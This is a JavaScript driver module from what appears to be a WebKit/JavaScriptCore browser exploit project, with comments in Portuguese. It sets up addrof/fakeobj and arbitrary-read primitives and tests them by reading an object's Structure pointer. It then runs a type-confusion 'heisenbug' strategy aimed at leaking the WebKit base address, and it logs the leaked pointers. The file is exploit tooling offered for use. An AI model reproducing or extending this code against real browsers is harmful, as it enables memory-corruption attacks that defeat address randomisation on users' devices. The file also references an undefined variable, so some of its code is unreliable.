// js/main.mjs

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './script3/testArrayBufferVictimCrash.mjs';
import { AdvancedInt64, setLogFunction } from './utils.mjs'; // Keep AdvancedInt64 for JIT test and import setLogFunction
import { JSC_OFFSETS } from './config.mjs'; // Import JSC_OFFSETS for detailed logging in core_exploit
import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read } from './core_exploit.mjs'; // Importar addrof_core, initCoreAddrofFakeobjPrimitives, arb_read

// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality (formerly from logger.mjs and s3_utils.mjs) ---
const outputDivId = 'output-advanced';

// Local log function that will be passed to modules
export const log = (message, type = 'info', funcName = '') => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality (formerly from utils.mjs and s3_utils.mjs) ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000; // New: Longer pause option

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test (moved from runAllAdvancedTestsS3.mjs) ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// --- NOVO: Teste Isolado da Primitiva addrof_core com objeto simples ---
async function testIsolatedAddrofCore(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = 'testIsolatedAddrofCore';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core e leitura de Structure* de objeto simples ---`, 'test', FNAME);

    let success = false;
    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(SHORT_PAUSE);

        const test_object = { p1: 0x11223344, p2: "Hello World", p3: [1, 2, 3] };
        logFn(`Criado objeto de teste: ${JSON.stringify(test_object)}`, 'info', FNAME);
        await pauseFn(SHORT_PAUSE);

        logFn(`Obtendo endereço do objeto de teste usando addrof_core...`, 'info', FNAME);
        const object_addr = addrof_core(test_object);
        logFn(`Endereço retornado por addrof_core: ${object_addr.toString(true)}`, 'leak', FNAME);

        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_object.`, 'error', FNAME);
            throw new Error("addrof_core returned invalid address.");
        }
        await pauseFn(SHORT_PAUSE);

        // Tentativa de ler o ponteiro da Structure* no offset 0x8 (JSCell::STRUCTURE_POINTER_OFFSET)
        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto...`, 'info', FNAME);
        const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_ptr_val = await arb_read(structure_ptr_addr, 8); // Requer arb_read funcional
        logFn(`Valor lido no offset da Structure*: ${structure_ptr_val.toString(true)}`, 'leak', FNAME);

        if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN. Isso indica que addrof_core pode não estar retornando um ponteiro de heap direto, ou o offset está incorreto, ou há um problema com tagging de JSValue.`, 'warn', FNAME);
            success = false; // Não é um sucesso total se a leitura da structure falha
        } else {
            logFn(`SUCESSO PARCIAL: Endereço do objeto obtido e leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, 'good', FNAME);
            success = true; // Indica que a primitiva addrof pode estar funcionando
        }

    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof_core: ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME);
        success = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core Concluído (Sucesso: ${success}) ---`, 'test', FNAME);
    }
    return success;
}


// --- Main Heisenbug Reproduction Strategy (formerly from runAllAdvancedTestsS3.mjs) ---
async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
    log(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    // Pass the local log and PAUSE functions to the exploit module
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        log(`  RUNNER R43(L): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        log(`  RUNNER R43(L): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        log(`  RUNNER R43(L): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        log(`  RUNNER R43(L): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            log(`  RUNNER R43(L): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkit_base_address || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}_R43L: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R43L: No TC Confirmed`;
        }
    } else {
        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
    }
    log(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE(MEDIUM_PAUSE);
    log(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}


// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test');

            try {
                // Execute JIT test first
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                // NOVO: Teste isolado da primitiva addrof_core
                const addrof_test_passed = await testIsolatedAddrofCore(log, PAUSE, JSC_OFFSETS);
                if (!addrof_test_passed) {
                    log("Teste isolado da primitiva addrof_core falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                    // Podemos decidir continuar ou não a estratégia principal com base neste resultado
                    // Para depuração, talvez seja melhor abortar se isso falhar.
                    runBtn.disabled = false;
                    return;
                }
                await PAUSE(LONG_PAUSE); // Pausa mais longa para revisar logs do teste addrof

                // Then run the main exploit strategy
                await runHeisenbugReproStrategy_TypedArrayVictim_R43();
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
}
